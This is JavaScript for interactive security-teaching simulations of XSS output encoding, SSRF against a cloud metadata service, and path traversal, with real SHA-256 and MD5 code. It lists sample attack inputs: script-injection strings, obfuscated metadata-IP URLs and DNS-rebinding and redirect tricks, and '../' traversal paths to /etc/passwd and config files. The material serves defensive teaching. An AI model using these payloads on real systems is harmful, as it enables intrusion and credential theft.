      while (/\s|\//.test(s[i] || "")) i++;
      if (i >= s.length || s[i] === ">") return { attrs, end: i + 1 };
      const m = /^[^\s=>\/]+/.exec(s.slice(i));
      if (!m) { i++; continue; }
      const name = m[0].toLowerCase(); i += m[0].length;
      while (s[i] === " ") i++;
      let val = "";
      if (s[i] === "=") {
        i++; while (s[i] === " ") i++;
        const q = s[i];
        if (q === '"' || q === "'") { const j = s.indexOf(q, i + 1); val = s.slice(i + 1, j < 0 ? s.length : j); i = j < 0 ? s.length : j + 1; }
        else { const m2 = /^[^\s>]*/.exec(s.slice(i)); val = m2[0]; i += val.length; }
      }
      attrs.push({ name, val: htmlDec(val) });
    }
    return { attrs, end: s.length };
  };
  const scanBody = (s, out) => {
    const re = /<script\b([^>]*)>([\s\S]*?)(<\/script\s*>|$)|<([a-z][a-z0-9]*)\b/gi;
    let m;
    while ((m = re.exec(s))) {
      if (m[2] !== undefined && m[0].toLowerCase().startsWith("<script")) {
        const nonce = /nonce=/.test(m[1]);
        if (!nonce && m[2].trim()) out.push({ kind: "new <script> element", code: m[2].trim(), cspBlocks: true });
        continue;
      }
      const pa = parseAttrs(s, m.index + m[0].length);
      pa.attrs.filter((a) => a.name.startsWith("on")).forEach((a) => out.push({ kind: `${a.name} event handler on <${m[4].toLowerCase()}>`, code: a.val, cspBlocks: true }));
      pa.attrs.filter((a) => a.name === "href" || a.name === "src").forEach((a) => { if (/^javascript:/i.test(a.val.replace(/[\x00-\x20]/g, ""))) out.push({ kind: `javascript: URL in ${a.name} (runs on click)`, code: a.val.replace(/^\s*javascript:/i, ""), cspBlocks: true }); });
    }
  };
  const textOf = (s) => htmlDec(s.replace(/<script\b[\s\S]*?(<\/script\s*>|$)/gi, "").replace(/<[^>]*>/g, ""));
  const browse = (ctx, html, raw) => {
    const out = [];
    let display = "", notes = [];
    if (ctx === "HTML body") { scanBody(html, out); display = textOf(html); }
    else if (ctx === "HTML attribute" || ctx === "URL in href") {
      const tag = ctx === "HTML attribute" ? "input" : "a";
      const pa = parseAttrs(html, tag.length + 1);
      pa.attrs.filter((a) => a.name.startsWith("on")).forEach((a) => out.push({ kind: `${a.name} event handler on <${tag}>`, code: a.val, cspBlocks: true }));
      const key = ctx === "HTML attribute" ? "value" : "href";
      const v = (pa.attrs.find((a) => a.name === key) || { val: "" }).val;
      if (ctx === "URL in href" && /^javascript:/i.test(v.replace(/[\x00-\x20]/g, ""))) out.push({ kind: "javascript: URL in href (runs on click)", code: v.replace(/^[\s\x00-\x20]*javascript:/i, ""), cspBlocks: true });
      const extra = pa.attrs.filter((a) => !["name", key].includes(a.name)).map((a) => a.name);
      if (extra.length) notes.push(`extra attributes: ${extra.join(", ")}`);
      const rest = html.slice(pa.end);
      scanBody(rest, out);
      display = ctx === "HTML attribute" ? `text box contains: ${v}` : `link goes to: ${v}`;
    } else {
      const open = html.indexOf(">") + 1;
      const close = html.toLowerCase().indexOf("</script", open);
      const body = html.slice(open, close < 0 ? html.length : close);
      const after = close < 0 ? "" : html.slice(html.indexOf(">", close) + 1);
      const start = body.indexOf("'") + 1;
      let i = start, closed = false;
      for (; i < body.length; i++) { if (body[i] === "\\") { i++; continue; } if (body[i] === "'") { closed = true; break; } }
      const lit = body.slice(start, i), tail = closed ? body.slice(i + 1).trim() : "";
      if (close >= 0 && close < html.length - "</script>".length) notes.push("the payload's </script> ended the script block early");
      if (!closed) notes.push("the JS string never closes: SyntaxError, this script block does nothing");
      else if (tail !== ";") out.push({ kind: "code after the string literal, inside the trusted <script>", code: tail.replace(/;?\s*\/\/.*$/, "").replace(/^;/, "").trim() || tail, cspBlocks: false });
      scanBody(after, out);
      display = `name = ${JSON.stringify(jsDec(lit))}${textOf(after).trim() ? `, and stray text on the page: "${textOf(after).trim()}"` : ""}`;
    }
    return { out, display, notes };
  };

  Viz.register("security-fundamentals-xss", (el) => Viz.player(el, {
    title: "XSS: the encoder must match the output context",
    tag: "TOKENIZER MODEL · STEP THROUGH",
    legend: [["done", "stays data"], ["bad", "becomes markup or script"], ["path", "blocked by CSP"]],
    inputs: [
      { key: "ctx", label: "where the value is written", type: "select", options: Object.keys(XCTX), value: "HTML body" },
      { key: "value", label: "value from the database (stored XSS) or the URL (reflected)", value: "<img src=x onerror=alert(document.cookie)>", width: 340 },
      { key: "enc", label: "encoding", type: "select", options: ["none", "HTML-encode", "context encoder"], value: "none" },
      { key: "csp", label: "Content-Security-Policy", type: "select", options: ["none", "strict (nonce-based)"], value: "none" },
    ],
    random: () => ({ ctx: pick(Object.keys(XCTX)), value: pick(["Tom & Jerry", "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\" autofocus onfocus=\"alert(1)", "javascript:alert(1)", "';alert(1);//", "</script><script>alert(1)</script>", "O'Neil <b>bold</b>"]), enc: pick(["none", "HTML-encode", "context encoder"]), csp: pick(["none", "strict (nonce-based)"]) }),
    build: ({ ctx, value, enc, csp }) => {
      if (value.length > 120) throw new Error("Keep the value under 120 characters.");
      const C = XCTX[ctx];
      const encoded = enc === "none" ? value : enc === "HTML-encode" ? htmlEnc(value) : C.rf(value);
      const html = C.pre + encoded + C.post;
      const codeLines = [`// ${ctx}: ${enc === "none" ? "string concatenation" : enc === "HTML-encode" ? "HTML-encode everywhere" : C.right}`, `string v = ${enc === "none" ? "name" : enc === "HTML-encode" ? C.enc : ctx === "URL in href" ? "HtmlEncoder.Default.Encode(IsHttpUrl(url) ? url : \"#\")" : ctx === "JavaScript string" ? C.right : C.enc};`, ...C.tpl.map((t) => t.replace("@name", "\" + v + \"").replace("@url", "\" + v + \"").replace("@nonce", "\" + nonce + \""))];
      const base = { ctx, value, enc, csp, encoded, html, ua: C.pre.length, ub: C.pre.length + encoded.length, code: codeLines };
      const fr = [];
      fr.push({ ...base, stage: "in", line: 0, note: `The value <code>${esc(value)}</code> is about to be written into ${ctx === "HTML body" ? "the text of a paragraph" : ctx === "HTML attribute" ? "a quoted attribute" : ctx === "URL in href" ? "a link's <code>href</code>" : "a JavaScript string inside a <code>&lt;script&gt;</code> block"}. It might have come from a database row (stored XSS), a query string (reflected XSS) or <code>location.hash</code> read by client code (DOM XSS).` });
      fr.push({ ...base, stage: "enc", line: 1, note: enc === "none" ? "No encoding: the bytes go into the page as they are." : `After ${enc === "HTML-encode" ? "HTML encoding" : `the context encoder (${esc(C.right)})`}: <code>${esc(encoded)}</code>.${enc === "HTML-encode" && ctx === "URL in href" ? " The scheme is untouched: <code>javascript:</code> contains no HTML special characters." : ""}${enc === "HTML-encode" && ctx === "JavaScript string" ? " HTML entities mean nothing inside a script block, though: the browser won't decode them there." : ""}` });
      const b = browse(ctx, html, value);
      fr.push({ ...base, stage: "html", line: C.tpl.length > 1 ? 3 : 2, b, note: `The server sends this HTML. The highlighted part came from the value. ${b.notes.length ? `The tokenizer notices: <b>${esc(b.notes.join("; "))}</b>.` : ""}` });
      const strict = csp !== "none";
      const runs = b.out.map((x) => ({ ...x, blocked: strict && x.cspBlocks }));
      fr.push({ ...base, stage: "parse", line: C.tpl.length > 1 ? 3 : 2, b, runs, note: runs.length ? `The browser finds <b>${runs.length} piece(s) of attacker script</b>: ${runs.map((r) => esc(r.kind)).join("; ")}.${strict ? ` The strict CSP ${runs.every((r) => r.blocked) ? "blocks all of them: they have no nonce, and inline handlers and <code>javascript:</code> URLs are not allowed." : runs.some((r) => r.blocked) ? "blocks some of them." : "<b>blocks none</b>: the code runs inside a script that already carries the right nonce. CSP can't tell your code from code injected into it."}` : ""}` : `The browser finds <b>no script</b> from the value. It is ${ctx === "JavaScript string" ? "a string" : "text"}, as intended.` });
      const exec = runs.filter((r) => !r.blocked);
      const wrongDisplay = (enc === "HTML-encode" && ctx === "JavaScript string" && /[&<>"']/.test(value)) ? "the user sees HTML entities like &amp;#39; inside the name: right idea, wrong encoder" : "";
      fr.push({ ...base, stage: "verdict", line: 1, b, runs, verdict: exec.length ? "bad" : runs.length ? "path" : "done", head: exec.length ? "Script runs in the victim's session" : runs.length ? "Injected, but CSP blocked it" : "Safe", sub: exec.length ? esc(exec.map((e) => e.code).join("  ·  ")) : runs.length ? "fix the encoding anyway: CSP is the seat belt, not the brakes" : wrongDisplay || "rendered as data",
        note: exec.length ? `The code runs with the user's cookies, tokens and DOM. ${enc === "HTML-encode" && ctx === "URL in href" ? "HTML encoding was the wrong tool: the browser decodes entities in attributes first, then follows a <code>javascript:</code> URL. Validate the <b>scheme</b>." : enc === "none" ? "Try <b>context encoder</b>." : ""} ${!strict ? "Also try the strict CSP to see which attacks it stops." : ""}`
          : runs.length ? "CSP stopped execution. The page is still broken (the markup is mangled), and an older browser or a CSP mistake would make it exploitable. Encoding is the fix; CSP is defence in depth."
            : `${wrongDisplay ? "<b>No script runs, but the output is wrong</b>: " + wrongDisplay + ". Use <code>JavaScriptEncoder</code>, or better, put the data in a <code>data-</code> attribute or a JSON block and read it from there." : "The value stayed data. The page shows exactly what the user typed."}` });
      return fr;
    },
    render: (f) => {
      const h = f.html, a = f.ua, b = f.ub;
      const bad = f.stage === "verdict" || f.stage === "parse" ? f.runs.some((r) => !r.blocked) : false;
      const src = `<pre class="sf-q">${esc(h.slice(0, a))}<span class="${f.stage === "in" || f.stage === "enc" || f.stage === "html" ? "sf-user" : bad ? "sf-inj" : "sf-data"}">${esc(h.slice(a, b))}</span>${esc(h.slice(b))}</pre>`;
      const steps = [
        `<div class="sf-kv"><span>value</span><code>${esc(f.value)}</code></div>`,
        f.stage !== "in" ? `<div class="sf-kv"><span>after encoding</span><code>${esc(f.encoded)}</code></div>` : "",
      ].join("");
      const runs = f.runs ? `<div class="sf-runs">${f.runs.length ? f.runs.map((r) => `<div class="sf-run ${r.blocked ? "path" : "bad"}"><b>${r.blocked ? "BLOCKED by CSP" : "RUNS"}</b><span>${esc(r.kind)}</span><code>${esc(r.code)}</code></div>`).join("") : `<div class="sf-run done"><b>NO SCRIPT</b><span>the value is inert data</span></div>`}</div>` : "";
      const disp = f.b && f.stage !== "html" ? `<div class="sf-kv"><span>page shows</span><code>${esc(f.b.display)}</code></div>` : "";
      const cspLine = f.csp !== "none" ? `<div class="sf-csp">Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'</div>` : "";
      return `<div class="sf-split"><div class="sf-split-l">${steps}<div class="sf-qbox"><div class="sf-h">HTML the browser receives</div>${f.stage === "in" ? `<pre class="sf-q sf-dimq">${esc(XCTX[f.ctx].pre)}<span class="sf-user">?</span>${esc(XCTX[f.ctx].post)}</pre>` : f.stage === "enc" ? `<pre class="sf-q sf-dimq">${esc(XCTX[f.ctx].pre)}<span class="sf-user">${esc(f.encoded)}</span>${esc(XCTX[f.ctx].post)}</pre>` : src}${cspLine}</div>${runs}${disp}${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}</div><div class="sf-split-r">${codePanel(f.code, "csharp", [f.line], "server-side rendering")}</div></div>`;
    },
  }));

  /* =====================================================================
   * 3. SSRF: a URL-preview feature, a cloud metadata endpoint, and four defences.
   * ===================================================================== */
  const parseV4 = (h) => {
    const parts = h.split(".");
    if (parts.length < 1 || parts.length > 4 || parts.some((p) => p === "")) return null;
    const nums = parts.map((p) => (/^0x[0-9a-f]+$/i.test(p) ? parseInt(p, 16) : /^0[0-7]+$/.test(p) ? parseInt(p, 8) : /^\d+$/.test(p) ? parseInt(p, 10) : NaN));
    if (nums.some((n) => !Number.isFinite(n))) return null;
    const last = nums[nums.length - 1], lead = nums.slice(0, -1);
    if (lead.some((n) => n > 255) || last >= Math.pow(256, 5 - nums.length)) return null;
    let v = last;
    lead.forEach((n, i) => { v += n * Math.pow(256, 3 - i); });
    return [v >>> 24, (v >>> 16) & 255, (v >>> 8) & 255, v & 255].join(".");
  };
  const parseHost = (h) => {
    const m6 = /^\[(.*)\]$/.exec(h);
    if (m6) { const mm = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i.exec(m6[1]); if (mm) { const x = parseInt(mm[1], 16), y = parseInt(mm[2], 16); return { ip: `${x >> 8}.${x & 255}.${y >> 8}.${y & 255}`, how: `IPv4-mapped IPv6 address ${m6[1]}` }; } const m4 = /^::ffff:(\d+\.\d+\.\d+\.\d+)$/i.exec(m6[1]); if (m4) return { ip: m4[1], how: "IPv4-mapped IPv6 address" }; return { ip: m6[1], how: "IPv6 literal" }; }
    const v4 = parseV4(h);
    if (v4) return { ip: v4, how: v4 === h ? "IPv4 literal" : `"${h}" is parsed as the IPv4 address ${v4}` };
    return null;
  };
  const DNS = {
    "images.partner.example": ["93.184.216.34"],
    "meta.attacker.example": ["169.254.169.254"],
    "rebind.attacker.example": ["93.184.216.34", "169.254.169.254"],
    localhost: ["127.0.0.1"],
  };
  const isPrivate = (ip) => {
    if (ip === "::1" || /^f[cd]/i.test(ip) || /^fe80/i.test(ip)) return "IPv6 loopback/private";
    const p = ip.split(".").map(Number);
    if (p.length !== 4) return null;
    if (p[0] === 127) return "loopback 127.0.0.0/8";
    if (p[0] === 10) return "private 10.0.0.0/8";
    if (p[0] === 172 && p[1] >= 16 && p[1] < 32) return "private 172.16.0.0/12";
    if (p[0] === 192 && p[1] === 168) return "private 192.168.0.0/16";
    if (p[0] === 169 && p[1] === 254) return "link-local 169.254.0.0/16 (cloud metadata)";
    if (p[0] === 0) return "0.0.0.0/8";
    return null;
  };
  const SERVERS = {
    "93.184.216.34": (path) => (path.startsWith("/redirect") ? { status: 302, loc: decodeURIComponent(path.split("to=")[1] || "/") } : { status: 200, body: "image/png, 48 KB (the preview you wanted)" }),
    "169.254.169.254": () => ({ status: 200, body: '{"AccessKeyId":"ASIA…EXAMPLE","SecretAccessKey":"wJal…EXAMPLEKEY","Token":"IQoJ…"}', secret: true }),
    "127.0.0.1": (path, port) => (port === "6379" ? { status: 200, body: "-ERR unknown command 'GET' (Redis is listening, unauthenticated)", secret: true } : { status: 200, body: "internal admin page", secret: true }),
  };
  const SSRF_URLS = [
    "https://images.partner.example/cat.png",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://2852039166/latest/meta-data/",
    "http://0xA9FEA9FE/latest/meta-data/",
    "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
    "http://meta.attacker.example/latest/meta-data/",
    "http://rebind.attacker.example/latest/meta-data/",
    "https://images.partner.example/redirect?to=http%3A%2F%2F2852039166%2Flatest%2Fmeta-data%2F",
    "http://127.1:6379/",
  ];
  const DEF = ["no check", "blocklist on the URL text", "hostname allowlist (follows redirects)", "resolve + check IP, not pinned", "resolve, check every IP, pin, re-check redirects"];
  const CHK = DEF[3], PIN = DEF[4];
  Viz.register("security-fundamentals-ssrf", (el) => Viz.player(el, {
    title: "SSRF: making your server fetch what the attacker can't reach",
    tag: "NETWORK SIMULATION · STEP THROUGH",
    legend: [["active", "current hop"], ["bad", "internal target reached"], ["done", "allowed"], ["path", "blocked"]],
    inputs: [
      { key: "url", label: "URL the attacker submits for a link preview", type: "select", options: SSRF_URLS, value: SSRF_URLS[2] },
      { key: "def", label: "defence", type: "select", options: DEF, value: DEF[1], width: 320 },
    ],
    random: () => ({ url: pick(SSRF_URLS), def: pick(DEF) }),
    build: ({ url, def }) => {
      const fr = [];
      let dnsCalls = 0;
      const resolve = (host) => { const r = DNS[host]; if (!r) return null; const ip = r[Math.min(dnsCalls, r.length - 1)]; dnsCalls++; return ip; };
      const parse = (u) => { const m = /^(https?):\/\/(\[[^\]]+\]|[^/:?#]+)(?::(\d+))?([^#]*)$/i.exec(u); return m ? { scheme: m[1], host: m[2].toLowerCase(), port: m[3] || "", path: m[4] || "/" } : null; };
      let cur = url, hop = 0;
      const base = { url, def };
      fr.push({ ...base, at: "attacker", note: `An attacker submits <code>${esc(url)}</code> to your "preview this link" feature. Your server will fetch it, from <b>inside</b> your network, where 169.254.169.254 (the cloud metadata service) and 127.0.0.1 are reachable.` });
      for (;;) {
        const u = parse(cur);
        if (!u) { fr.push({ ...base, at: "app", verdict: "path", head: "Malformed URL", sub: "", note: "The URL doesn't parse." }); return fr; }
        const lit = parseHost(u.host);
        fr.push({ ...base, at: "app", u, lit, hop, note: `Parse: host <code>${esc(u.host)}</code>${u.port ? `, port ${u.port}` : ""}. ${lit ? `It's an IP literal: ${esc(lit.how)}.` : "It's a hostname, so it must be resolved through DNS."}` });
        if (def === DEF[1] && hop === 0) {
          const hit = ["169.254.169.254", "localhost", "127.0.0.1", "metadata", "[::1]"].find((b) => cur.toLowerCase().includes(b));
          fr.push({ ...base, at: "app", u, lit, hop, check: hit ? "bad" : "pass", note: hit ? `The blocklist finds <code>${esc(hit)}</code> in the URL text and rejects it.` : `The blocklist looks for <code>169.254.169.254</code>, <code>localhost</code>, <code>127.0.0.1</code>… in the <b>text</b>. None of them appear, so the URL passes. ${lit && lit.ip !== u.host ? `But the text <code>${esc(u.host)}</code> <i>means</i> ${lit.ip}.` : ""}` });
          if (hit) { fr.push({ ...base, at: "app", verdict: "path", head: "Blocked", sub: "this time: the same target has dozens of other spellings", note: `Blocked. Now try the decimal, hex, IPv6, DNS, rebinding or redirect versions of the same address against this blocklist.` }); return fr; }
        }
        const checking = hop === 0 || def === PIN;
        if (def === DEF[2] && checking) {
          const ok = u.host === "images.partner.example";
          fr.push({ ...base, at: "app", u, lit, hop, check: ok ? "pass" : "bad", note: ok ? `<code>${esc(u.host)}</code> is on the allowlist.` : `<code>${esc(u.host)}</code> is not on the allowlist. Rejected.` });
          if (!ok) { fr.push({ ...base, at: "app", verdict: "path", head: "Blocked", sub: "an allowlist is the strongest simple control", note: "Blocked. Only the partner's image host is allowed. But watch what happens if that host has an open redirect: try the <code>/redirect?to=</code> URL." }); return fr; }
        }
        let ip = lit ? lit.ip : null;
        if ((def === CHK || def === PIN) && checking) {
          if (!ip) { ip = resolve(u.host); fr.push({ ...base, at: "dns", u, lit, hop, ip, note: `The validator resolves <code>${esc(u.host)}</code> → <code>${esc(ip || "NXDOMAIN")}</code>.` }); }
          const why = ip ? isPrivate(ip) : "does not resolve";
          fr.push({ ...base, at: "app", u, lit, hop, ip, check: why ? "bad" : "pass", note: why ? `<code>${esc(ip || u.host)}</code> is <b>${esc(why)}</b>. Rejected.` : `<code>${esc(ip)}</code> is a public address. Allowed. ${def === PIN ? "The connection will be made to <b>this exact IP</b> (pinned), not to whatever DNS says a millisecond later." : "Then the URL is handed to the HTTP client, <b>which resolves the name again</b>."}` });
          if (why) { fr.push({ ...base, at: "app", verdict: "path", head: "Blocked", sub: `checked the resolved address: ${esc(why)}`, note: `Blocked, because the check ran on the <b>address we would actually connect to</b>, after the parsing and DNS tricks were resolved.${hop ? " Redirects are re-checked hop by hop, so the open redirect doesn't help." : ""}` }); return fr; }
          if (def === CHK && !lit) {
            ip = resolve(u.host);
            fr.push({ ...base, at: "dns", u, lit, hop, ip, note: DNS[u.host] && DNS[u.host].length > 1 ? `<b>DNS rebinding.</b> The attacker's DNS server uses TTL 0. The validator saw a public IP; the HTTP client resolves again and now gets <code>${esc(ip)}</code>. Time-of-check vs time-of-use.` : `The HTTP client resolves <code>${esc(u.host)}</code> again → <code>${esc(ip)}</code> (same answer this time).` });
          }
        } else if (!ip) {
          ip = resolve(u.host);
          fr.push({ ...base, at: "dns", u, lit, hop, ip, note: `The HTTP client resolves <code>${esc(u.host)}</code> → <code>${esc(ip || "NXDOMAIN")}</code>.${DNS[u.host] && DNS[u.host].length > 1 && hop === 0 ? " (This name rebinds on the <i>second</i> lookup; with no validator, there's nothing to fool. Try <b>resolve + check IP, not pinned</b>.)" : ""}` });
          if (!ip) { fr.push({ ...base, at: "app", verdict: "path", head: "DNS failure", sub: "", note: "No such host." }); return fr; }
        }
        const srv = SERVERS[ip];
        const res = srv ? srv(u.path, u.port) : { status: 504, body: "timeout" };
        fr.push({ ...base, at: ip, u, lit, hop, ip, res, note: `Connect to <code>${esc(ip)}${u.port ? ":" + u.port : ""}</code> and send <code>GET ${esc(u.path.length > 50 ? u.path.slice(0, 50) + "…" : u.path)}</code> → <b>${res.status}</b>${res.loc ? ` with <code>Location: ${esc(res.loc)}</code>` : ""}.` });
        if (res.status === 302 && hop < 3) {
          hop++; cur = res.loc;
          fr.push({ ...base, at: "app", hop, note: `The client follows the redirect to <code>${esc(cur)}</code>. ${def === PIN ? "Our fetch wrapper turned automatic redirects off and runs every hop through the same check." : def === DEF[0] || def === DEF[1] ? "Nothing re-checks it." : "Most HTTP clients follow redirects by default, and the check only ran on the URL we were given."}` });
          continue;
        }        fr.push({ ...base, at: ip, res, ip, verdict: res.secret ? "bad" : "done", head: res.secret ? (ip === "169.254.169.254" ? "Cloud credentials leaked" : "Internal service reached") : "Preview fetched", sub: res.secret ? esc(res.body.slice(0, 70)) : "a public image, as intended",
          note: res.secret ? `The response goes back to the attacker inside the "preview". ${ip === "169.254.169.254" ? "With those temporary keys they act as your server's cloud identity. IMDSv2 (a PUT for a session token first) and least-privilege roles limit the damage; validating the destination prevents it." : "Internal services often trust anything from localhost and have no authentication."}` : `A normal public fetch. ${def === DEF[0] ? "It's safe only because the URL was. Try the metadata URLs." : ""}` });
        return fr;
      }
    },
    render: (f) => {
      const N = { attacker: [76, 70, "Attacker", "browser"], app: [270, 70, "Preview service", "your server"], dns: [270, 190, "DNS resolver", ""], "93.184.216.34": [520, 70, "images.partner", "93.184.216.34"], "169.254.169.254": [520, 175, "Metadata service", "169.254.169.254"], "127.0.0.1": [520, 255, "Redis", "127.0.0.1:6379"] };
      let b = `<rect x="180" y="20" width="440" height="275" rx="10" class="sf-zone"/>` + txt(190, 38, "your cloud network (trust boundary)", "sf-s");
      const at = f.at, hot = (k) => k === at;
      const cls = (k) => (hot(k) ? (f.verdict === "bad" || (f.res && f.res.secret && k !== "app") ? "bad" : f.verdict === "path" || f.check === "bad" ? "path" : "active") : f.verdict === "bad" && (k === "169.254.169.254" || k === "127.0.0.1") && k === at ? "bad" : "");
      const edges = [["attacker", "app"], ["app", "dns"], ["app", "93.184.216.34"], ["app", "169.254.169.254"], ["app", "127.0.0.1"]];
      edges.forEach(([x, y]) => {
        const A = N[x], B = N[y];
        const on = (x === "attacker" && at === "attacker") || (y === at && x === "app");
        b += arrow(A[0] + 70, A[1] + (y === "dns" ? 22 : 0), B[0] - (y === "dns" ? -0 : 70), B[1] + (y === "dns" ? -22 : 0), on ? (f.res && f.res.secret ? "bad" : "active") : "");
      });
      Object.entries(N).forEach(([k, [x, y, t, s]]) => {
        b += `<rect class="box ${cls(k)}" x="${x - 70}" y="${y - 22}" width="140" height="44" rx="7"/>` + txt(x, y - 3, t, "sf-t", "middle") + txt(x, y + 13, s, "sf-s", "middle");
      });
      const fig = svg(640, 300, b, "SSRF network map");
      const rows = [];
      if (f.u) rows.push(`<div class="sf-kv"><span>host</span><code>${esc(f.u.host)}</code></div>`);
      if (f.lit) rows.push(`<div class="sf-kv"><span>really means</span><code>${esc(f.lit.ip)}</code></div>`);
      if (f.ip && !f.lit) rows.push(`<div class="sf-kv"><span>resolved to</span><code>${esc(f.ip)}</code></div>`);
      if (f.check) rows.push(`<div class="sf-kv"><span>check</span><code class="${f.check === "pass" ? "sf-okc" : "sf-koc"}">${f.check === "pass" ? "passed" : "rejected"}</code></div>`);
      if (f.res) rows.push(`<div class="sf-kv"><span>response</span><code class="${f.res.secret ? "sf-koc" : ""}">${f.res.status} ${esc(f.res.body || "")}</code></div>`);
      return `<div class="sf-split"><div class="sf-fig">${fig}</div><div class="sf-split-r sf-wide">${rows.join("") || `<div class="sf-kv"><span>url</span><code>${esc(f.url)}</code></div>`}${f.verdict ? verdict(f.verdict, f.head, f.sub) : ""}</div></div>`;
    },
  }));

  /* =====================================================================
   * Real hash functions (SHA-256 and MD5) so the hashes on screen are genuine.
   * ===================================================================== */
  const utf8 = (s) => new TextEncoder().encode(s);
  const hex = (u8) => Array.from(u8, (b) => b.toString(16).padStart(2, "0")).join("");
  const PRIMES = []; for (let n = 2; PRIMES.length < 64; n++) if (PRIMES.every((p) => n % p)) PRIMES.push(n);
  const frac32 = (x) => Math.floor((x - Math.floor(x)) * 4294967296) >>> 0;
  const K256 = PRIMES.map((p) => frac32(Math.cbrt(p))), H256 = PRIMES.slice(0, 8).map((p) => frac32(Math.sqrt(p)));
  const ror = (x, n) => (x >>> n) | (x << (32 - n));
  const sha256 = (msg) => {
    const bytes = typeof msg === "string" ? utf8(msg) : msg, l = bytes.length, n = ((l + 9 + 63) >> 6) << 6;
    const m = new Uint8Array(n); m.set(bytes); m[l] = 0x80;
    const dv = new DataView(m.buffer);
    dv.setUint32(n - 8, Math.floor((l * 8) / 4294967296)); dv.setUint32(n - 4, (l * 8) >>> 0);
    const H = H256.slice(), w = new Uint32Array(64);
    for (let o = 0; o < n; o += 64) {
      for (let i = 0; i < 16; i++) w[i] = dv.getUint32(o + i * 4);
      for (let i = 16; i < 64; i++) { const a = w[i - 15], b = w[i - 2]; w[i] = (w[i - 16] + (ror(a, 7) ^ ror(a, 18) ^ (a >>> 3)) + w[i - 7] + (ror(b, 17) ^ ror(b, 19) ^ (b >>> 10))) >>> 0; }
      let [a, b, c, d, e, f, g, h] = H;
      for (let i = 0; i < 64; i++) {
        const t1 = (h + (ror(e, 6) ^ ror(e, 11) ^ ror(e, 25)) + ((e & f) ^ (~e & g)) + K256[i] + w[i]) >>> 0;
        const t2 = ((ror(a, 2) ^ ror(a, 13) ^ ror(a, 22)) + ((a & b) ^ (a & c) ^ (b & c))) >>> 0;
        h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
      }
      [a, b, c, d, e, f, g, h].forEach((v, i) => { H[i] = (H[i] + v) >>> 0; });
    }
    const out = new Uint8Array(32), odv = new DataView(out.buffer);
    H.forEach((v, i) => odv.setUint32(i * 4, v));
    return out;
  };
  const MD5T = Array.from({ length: 64 }, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296) >>> 0);
  const MD5S = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
  const md5 = (str) => {
    const bytes = utf8(str), l = bytes.length, n = (((l + 8) >> 6) + 1) << 6;
    const m = new Uint8Array(n); m.set(bytes); m[l] = 0x80;
    const dv = new DataView(m.buffer);
    dv.setUint32(n - 8, (l * 8) >>> 0, true); dv.setUint32(n - 4, Math.floor((l * 8) / 4294967296), true);
    let a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
    for (let o = 0; o < n; o += 64) {
      let A = a0, B = b0, C = c0, D = d0;
      for (let i = 0; i < 64; i++) {
        const r = i >> 4;
        let F, g;
        if (r === 0) { F = (B & C) | (~B & D); g = i; } else if (r === 1) { F = (D & B) | (~D & C); g = (5 * i + 1) % 16; } else if (r === 2) { F = B ^ C ^ D; g = (3 * i + 5) % 16; } else { F = C ^ (B | ~D); g = (7 * i) % 16; }
        F = (F + A + MD5T[i] + dv.getUint32(o + g * 4, true)) >>> 0;
        A = D; D = C; C = B;
        const s = MD5S[r * 4 + (i % 4)];
        B = (B + ((F << s) | (F >>> (32 - s)))) >>> 0;
      }
      a0 = (a0 + A) >>> 0; b0 = (b0 + B) >>> 0; c0 = (c0 + C) >>> 0; d0 = (d0 + D) >>> 0;
    }
    const out = new Uint8Array(16), odv = new DataView(out.buffer);
    [a0, b0, c0, d0].forEach((v, i) => odv.setUint32(i * 4, v, true));
    return out;
  };

  /* =====================================================================
   * 4. Path traversal: decode, sanitize, join, check, resolve, open.
   * ===================================================================== */
  const FS = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash",
    "/srv/app/appsettings.json": '{ "ConnectionStrings": { "Db": "Server=…;Password=Pr0d!" } }',
    "/srv/app/uploads/report.pdf": "%PDF-1.7 (the file you asked for)",
    "/srv/app/uploads/avatars/joel.png": "PNG image",
    "/srv/app/uploads-private/salaries.xlsx": "everyone's salary",
  };
  const FILE_IDS = { "7": "report.pdf", "8": "avatars/joel.png" };
  const BASE = "/srv/app/uploads";
  const normalize = (p) => { const out = []; p.split("/").forEach((s) => { if (s === "..") out.pop(); else if (s && s !== ".") out.push(s); }); return "/" + out.join("/"); };
  const PT_TRIES = ["report.pdf", "avatars/../report.pdf", "../appsettings.json", "../../../../etc/passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//appsettings.json", "/etc/passwd", "../uploads-private/salaries.xlsx", "7"];
  const PT_DEF = ["none", "remove \"../\"", "startsWith(base), not normalized", "normalize, then startsWith(base)", "normalize, then startsWith(base + \"/\")", "opaque file IDs (no paths)"];
  const PT_CODE = {
    none: ["var path = Path.Combine(BaseDir, name);", "return File.OpenRead(path);"],
    'remove "../"': ["name = name.Replace(\"../\", \"\");   // \"sanitize\"", "var path = Path.Combine(BaseDir, name);", "return File.OpenRead(path);"],
    "startsWith(base), not normalized": ["var path = Path.Combine(BaseDir, name);", "if (!path.StartsWith(BaseDir)) return Forbid();", "return File.OpenRead(path);"],
    "normalize, then startsWith(base)": ["var path = Path.GetFullPath(Path.Combine(BaseDir, name));", "if (!path.StartsWith(BaseDir)) return Forbid();", "return File.OpenRead(path);"],
    'normalize, then startsWith(base + "/")': ["var root = Path.GetFullPath(BaseDir) + Path.DirectorySeparatorChar;", "var path = Path.GetFullPath(Path.Combine(root, name));", "if (!path.StartsWith(root, StringComparison.Ordinal)) return Forbid();", "return File.OpenRead(path);"],
    "opaque file IDs (no paths)": ["var row = await db.Files.FindAsync(id);   // id from the URL", "if (row is null || row.OwnerId != userId) return NotFound();", "return File.OpenRead(Path.Combine(BaseDir, row.StoredName));"],
  };
  Viz.register("security-fundamentals-path", (el) => Viz.player(el, {
    title: "Path traversal: where ../ escapes the folder",
    tag: "PATH SIMULATION · STEP THROUGH",
